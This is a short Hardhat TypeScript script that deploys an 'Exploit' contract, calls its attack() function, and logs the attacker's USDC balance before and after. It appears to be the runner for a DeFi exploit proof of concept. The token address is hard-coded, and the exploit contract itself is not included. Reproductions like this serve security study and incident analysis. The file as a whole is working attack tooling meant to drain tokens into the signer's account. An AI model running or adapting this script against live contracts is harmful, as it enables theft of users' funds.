import hre from "hardhat"
import {Exploit__factory, IERC20__factory} from "../typechain";
import {parseEther} from "ethers/lib/utils";

async function main() {
    const [signer] = await hre.ethers.getSigners();
    const usdc = IERC20__factory.connect("0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",signer);
    const exploit = await new Exploit__factory(signer).deploy();

    console.log("USDC balance of attacker:",hre.ethers.utils.formatUnits(await usdc.balanceOf(signer.address),await usdc.decimals()))
    console.log("Exploiting...")
    await exploit.attack({value:parseEther("0.0001")});
    console.log("Exploit complete.")
    console.log("USDC balance of attacker:",hre.ethers.utils.formatUnits(await usdc.balanceOf(signer.address),await usdc.decimals()))
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});